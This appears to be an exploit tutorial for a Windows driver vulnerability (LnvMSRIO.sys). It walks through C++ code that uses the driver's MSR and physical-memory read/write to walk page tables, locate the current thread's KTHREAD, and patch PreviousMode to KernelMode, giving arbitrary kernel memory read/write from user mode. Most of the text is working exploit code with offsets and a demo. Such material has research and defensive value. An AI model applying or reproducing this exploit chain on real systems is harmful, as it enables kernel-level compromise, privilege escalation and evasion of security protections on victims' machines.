# 04 — PreviousMode Abuse (Arbitrary Kernel VA Read/Write)

**File:** `04_previousmode.cpp`  
**CVE:** CVE-2025-8061 (LnvMSRIO.sys)  
**Primitive used:** MSR read + Physical read/write + Page table walk  
**Output:** Kernel VA readable directly from user-mode via `NtReadVirtualMemory`

---

## Objective

Patch `KTHREAD.PreviousMode` from `1` (UserMode) to `0` (KernelMode) for the current thread. Result: `NtReadVirtualMemory` / `NtWriteVirtualMemory` are no longer blocked by `ProbeForRead` when the target address is a kernel VA → arbitrary kernel VA read/write from user-mode becomes possible.

---

## Background Theory

### ProbeForRead / ProbeForWrite

Every Windows syscall that receives a pointer from user-mode calls:

```c
VOID ProbeForRead(PVOID Address, SIZE_T Length, ULONG Alignment) {
    if (PreviousMode != KernelMode) {
        // Check that address < MmUserProbeAddress (~0x7FFF...FFFF)
        if (Address + Length - 1 >= MmUserProbeAddress)
            ExRaiseAccessViolation();  // raises exception → syscall fails
    }
    // If PreviousMode == KernelMode → skip check entirely
}
```

`PreviousMode` is a byte in the `KTHREAD` of the current thread, set by the syscall dispatcher upon entering the kernel:
- Syscall from user-mode: sets `PreviousMode = 1` (UserMode)
- Internal kernel calls: `PreviousMode = 0` (KernelMode)

If we patch this byte to `0`, the `NtReadVirtualMemory(kernel_va)` syscall will not be rejected by ProbeForRead → kernel memory is readable.

### This Technique Is Widely Used in the Wild

The Lazarus Group FudModule (CVE-2022-21882, CVE-2024-21338) both use this technique. After setting PreviousMode = 0, they use `NtReadVirtualMemory` to read the full kernel structure set without requiring a second driver.

### Why Pin the Thread to a Single CPU?

`CurrentThread` in KPRCB is a per-CPU field. If the thread is migrated to a different CPU by the scheduler while we are reading the KPRCB of CPU 0, we will read the `CurrentThread` of a *different* thread on CPU 0 → wrong KTHREAD → patch the wrong thread → crash.

```cpp
SetThreadAffinityMask(hThread, 1);           // run on CPU 0 only
SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL); // reduce preemption likelihood
```

---

## Pointer Chain: KPCR → KPRCB → CurrentThread → KTHREAD

```
MSR 0xC0000101 (GS_BASE while in kernel) = KPCR VA
    KPCR + 0x180 = start of KPRCB (embedded within KPCR)
    KPRCB + 0x008 = CurrentThread (PKTHREAD*)
    → KPCR + 0x188 = address of the pointer to the current KTHREAD

*KPCR[0x188] = KTHREAD VA of the current thread
    KTHREAD + 0x232 = PreviousMode (1 byte)
```

---

## Line-by-Line Code Explanation

### VaToPa() — 4-Level Page Table Walk

```cpp
static uint64_t VaToPa(uint64_t cr3, uint64_t va)
{
    uint64_t pml4_pa = cr3 & ~0xFFFULL;  // CR3 may have a PCID in bits [11:0]
                                           // clear to get the physical address of PML4

    auto idx = [&](int shift) { return (va >> shift) & 0x1FF; };
    // Each level index is 9 bits

    // Level 1: PML4
    uint64_t pml4e = 0;
    PhysReadU64(pml4_pa + idx(39) * 8, &pml4e);
    // idx(39): bits [47:39] of VA = PML4 index (9 bits)
    // × 8: each entry is 8 bytes
    if (!(pml4e & 1)) return 0;  // bit 0 = Present
    uint64_t pdpt_pa = pml4e & 0x000FFFFFFFFFF000ULL;  // bits [51:12] = PA of PDPT
```

x64 VA layout (48-bit canonical):
```
bit 47-39: PML4 index   (9 bits → 512 entries)
bit 38-30: PDPT index   (9 bits)
bit 29-21: PD index     (9 bits)
bit 20-12: PT index     (9 bits)
bit 11-0:  page offset  (12 bits)
```

```cpp
    // Level 2: PDPT
    uint64_t pdpte = 0;
    PhysReadU64(pdpt_pa + idx(30) * 8, &pdpte);
    if (!(pdpte & 1)) return 0;
    if (pdpte & 0x80) {  // bit 7 = PageSize → 1GB large page
        // bits [51:30] = physical base, bits [29:0] = offset from VA
        return (pdpte & 0x000FFFFFC0000000ULL) | (va & 0x3FFFFFFFULL);
    }
    uint64_t pd_pa = pdpte & 0x000FFFFFFFFFF000ULL;
```

1GB large page: if the PDPTE has bit 7 set, no further lookup is needed. Physical address = `(pdpte & mask_1gb_base) | (va & 0x3FFFFFFF)`.

```cpp
    // Level 3: PD
    uint64_t pde = 0;
    PhysReadU64(pd_pa + idx(21) * 8, &pde);
    if (!(pde & 1)) return 0;
    if (pde & 0x80) {  // 2MB large page (commonly used by ntoskrnl)
        return (pde & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);
    }
    uint64_t pt_pa = pde & 0x000FFFFFFFFFF000ULL;

    // Level 4: PT
    uint64_t pte = 0;
    PhysReadU64(pt_pa + idx(12) * 8, &pte);
    if (!(pte & 1)) return 0;
    return (pte & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);  // 4KB page
```

### GetSystemCR3()

```cpp
static uint64_t GetSystemCR3()
{
    ...
    for (DWORD off = 0; off + minTrail <= rlen; off += 8) {
        ULONG_PTR pid = *(ULONG_PTR *)(chunk + off + EPROC_OFF_PID);
        if (pid != 4) continue;                // PID = 4 (System)
        const char *fn = (const char *)(chunk + off + EPROC_OFF_FNAME);
        if (_strnicmp(fn, "System", 6) != 0) continue;

        uint64_t eproc_pa = pa + off;
        cr3 = *(uint64_t *)(chunk + off + EPROC_OFF_CR3);  // EPROCESS+0x028

        if (cr3 && !(cr3 & 0xFFF)) {  // CR3 must be page-aligned (bits [11:0] = 0)
            break;
        }
        cr3 = 0;  // misaligned → false positive, continue scanning
    }
```

`EPROC_OFF_CR3 = 0x028`: `EPROCESS.DirectoryTableBase` = the CR3 register value for the System process. All kernel VAs are mapped identically in the upper half of every address space → the System CR3 can be used to walk any kernel VA.

### Reading KPCR via MSR

```cpp
uint64_t kpcr_va = 0;
if (!ReadMSR(0xC0000101, &kpcr_va) || !kpcr_va) {
    printf("[-] Failed to read GS_BASE (KPCR)\n");
```

MSR `0xC0000101` = `IA32_GS_BASE`. The driver executes RDMSR in kernel context. In kernel context, GS points to the KPCR of the current CPU → `GS_BASE` = KPCR VA.

```cpp
if (kpcr_va < 0xFFFF000000000000ULL) {
    // Try KERNEL_GS_BASE (0xC0000102) as fallback
    printf("    Trying KERNEL_GS_BASE (0xC0000102)...\n");
    ReadMSR(0xC0000102, &kpcr_va);
```

Fallback: on some builds or if SWAPGS timing differs, `0xC0000102` may be the KPCR instead of `0xC0000101`.

### Reading CurrentThread

```cpp
uint64_t currentthread_ptr_va = kpcr_va + 0x188;
// KPCR+0x180 = KPRCB, KPRCB+0x008 = CurrentThread
// → KPCR+0x188 = address of the KTHREAD pointer

uint64_t currentthread_ptr_pa = VaToPa(cr3, currentthread_ptr_va);
// Translate the VA of KPRCB.CurrentThread to PA for physical reading

uint64_t kthread_va = 0;
PhysReadU64(currentthread_ptr_pa, &kthread_va);
// Read the value: this is the KTHREAD VA of the current thread
```

```cpp
// Verify: KTHREAD starts with DISPATCHER_HEADER
// Header.Type = 6 = ThreadObject (enum KOBJECTS)
uint64_t kthread_pa = VaToPa(cr3, kthread_va);
uint8_t hdr_type = 0;
PhysRead(kthread_pa, &hdr_type, 1);
if (hdr_type != 6) {
    printf("[-] KTHREAD validation failed. Scheduler may have moved us.\n");
```

DISPATCHER_HEADER.Type is the first byte of KTHREAD. Value 6 = `ThreadObject`. If different → the affinity mask may not have taken effect yet and the scheduler preempted us → try again.

### Patch and Verify

```cpp
uint64_t prevmode_va = kthread_va + 0x232;  // KTHREAD+0x232 = PreviousMode
uint64_t prevmode_pa = VaToPa(cr3, prevmode_va);

uint8_t prevmode_orig = 0xFF;
PhysRead(prevmode_pa, &prevmode_orig, 1);
// Expected: 1 (UserMode)

// Patch!
PhysWriteU8(prevmode_pa, 0x00);  // KernelMode

uint8_t readback = 0xFF;
PhysRead(prevmode_pa, &readback, 1);
// Must be 0
```

### Demo: Reading a Kernel VA

```cpp
printf("[*] NtReadVirtualMemory(ntoskrnl_base) AFTER patch:\n");
uint8_t kernel_read[64] = {};
SIZE_T nread = 0;
LONG status = g_NtRVM(GetCurrentProcess(),
                     (PVOID)(uintptr_t)ntoskrnl_base,  // kernel VA!
                     kernel_read, sizeof(kernel_read), &nread);

// Result: status=0x00000000 (SUCCESS)
// kernel_read[0] = 'M', kernel_read[1] = 'Z' → ntoskrnl MZ header is readable!
```

### RESTORE — Critical

```cpp
printf("[*] Restoring PreviousMode: 0 → 1...\n");
PhysWriteU8(prevmode_pa, 0x01);  // back to UserMode

// Restore thread settings
SetThreadPriority(hThread, THREAD_PRIORITY_NORMAL);
SetThreadAffinityMask(hThread, (DWORD_PTR)-1);  // allow running on all CPUs
```

**Why must we restore immediately?** If PreviousMode remains 0, every subsequent syscall from this thread bypasses ProbeForRead. If any later code in the thread passes a random pointer to a syscall, the kernel may read from or write to arbitrary kernel memory → system instability → BSOD.

---

## Stability

| Issue | Explanation |
|-------|-------------|
| Race condition with scheduler | Mitigated with `SetThreadAffinityMask(1)`, but a small window remains |
| PatchGuard | Does not check the PreviousMode field |
| Restore | Must restore IMMEDIATELY before the thread does anything else. This code restores right after the demo |
| Thread timing | `THREAD_PRIORITY_TIME_CRITICAL` reduces the chance of mid-operation preemption |

---

## Flow Summary

```
GetSystemCR3() → cr3

ReadMSR(0xC0000101) → kpcr_va
SetThreadAffinityMask(1)  ← pin to CPU 0
    ↓
VaToPa(cr3, kpcr_va + 0x188) → currentthread_ptr_pa
PhysReadU64(currentthread_ptr_pa) → kthread_va
    ↓
VaToPa(cr3, kthread_va + 0x232) → prevmode_pa
PhysRead(prevmode_pa) = 1 (UserMode) ✓
    ↓
PhysWriteU8(prevmode_pa, 0x00)  ← PreviousMode = KernelMode
    ↓
NtReadVirtualMemory(ntoskrnl_base) → MZ bytes ✓  (kernel VA readable!)
    ↓
PhysWriteU8(prevmode_pa, 0x01)  ← RESTORE UserMode
SetThreadAffinityMask(-1)
```
